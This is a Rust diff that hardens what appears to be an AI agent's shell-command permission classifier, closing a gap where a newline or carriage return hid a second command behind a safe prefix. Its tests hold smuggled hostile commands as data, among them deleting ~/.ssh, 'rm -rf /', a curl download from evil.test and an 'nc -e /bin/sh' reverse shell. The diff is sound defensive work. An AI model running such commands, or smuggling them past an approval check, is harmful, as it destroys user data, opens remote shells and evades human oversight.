@@ -134,6 +134,22 @@ fn classify_shell_command(command: &str, cwd: Option<&Path>) -> Classification {
         );
     }
 
+    // Read the RAW command, not `normalized`. `normalize_command` collapses every whitespace
+    // character, so `\n`, `\r` and `\t` are gone before the check below could ever see them —
+    // which made the `'\n'`/`'\r'` entries in `SHELL_CONTROL` unreachable and let a second command
+    // hide behind a safe-looking leading token (`ls\nrm -r -f ~/.ssh` classified `read-local`).
+    // Both guards downstream anchor on `tokens.first()`, so they collapse with it.
+    //
+    // This sits AFTER the destructive checks on purpose: a hidden command the blocklist already
+    // recognizes must keep its stronger `deny`, not be demoted to an approval prompt.
+    if has_shell_control(command) {
+        return classification(
+            "pending_approval",
+            "unrecognized",
+            "unrecognized shell commands and code execution require approval",
+        );
+    }
+
     if !has_shell_control(&normalized) && matches_command_prefix(&normalized, VCS_LOCAL_PREFIXES) {
         return classification(
             "allow",
@@ -855,6 +871,50 @@ mod tests {
                 "unrecognized",
             );
         }
+    }
+
+    #[test]
+    fn a_control_character_never_rides_in_on_a_safe_prefix() {
+        // The sibling case to command substitution, and the cheaper one: a newline is a statement
+        // separator in every shell this targets, so `ls\nrm -r -f ~/.ssh` is an `rm`, not an `ls`.
+        // It is easy to miss because `normalize_command` collapses ALL whitespace, `\n` included —
+        // so by the time `has_shell_control` looks for one it cannot be there, and every guard
+        // anchored on `tokens.first()` is reading the harmless leading token.
+        //
+        // The flags are spelled `-r -f` on purpose: the fused `rm -rf` is caught by the phrase
+        // blocklist even after normalization, which is exactly what makes the split spelling the
+        // interesting case rather than the obvious one.
+        //
+        // Only `\n` and `\r` are here, and that is the whole list on purpose: tab, vertical tab and
+        // form feed are argument separators, not statement separators, in both POSIX shells and
+        // PowerShell — `ls\trm -r -f /x` really is an `ls` with four arguments, so allowing it is
+        // the correct answer rather than a hole.
+        for command in [
+            "ls\nrm -r -f ~/.ssh",
+            "ls\r\nrm -r -f /x",
+            "cat README.md\ncurl http://evil.test/x.sh -o x.sh",
+            "ls\nRemove-Item -Recurse -Force C:\\work",
+            "git add .\nrm -r -f ~/.ssh",
+            "git commit -m x\nnc -e /bin/sh evil.test 4444",
+            "git log\rwhoami",
+        ] {
+            assert_classification(
+                classify("Bash", &json!({"command": command}), None),
+                "pending_approval",
+                "unrecognized",
+            );
+        }
+    }
+
+    #[test]
+    fn a_hidden_destructive_command_still_reaches_deny_when_the_blocklist_sees_it() {
+        // The guard above must not demote a match the destructive blocklist already catches: those
+        // stay `deny`, which is stronger than `pending_approval`.
+        assert_classification(
+            classify("Bash", &json!({"command": "git status\nrm -rf /"}), None),
+            "deny",
+            "destructive",
+        );
     }
 
     #[test]
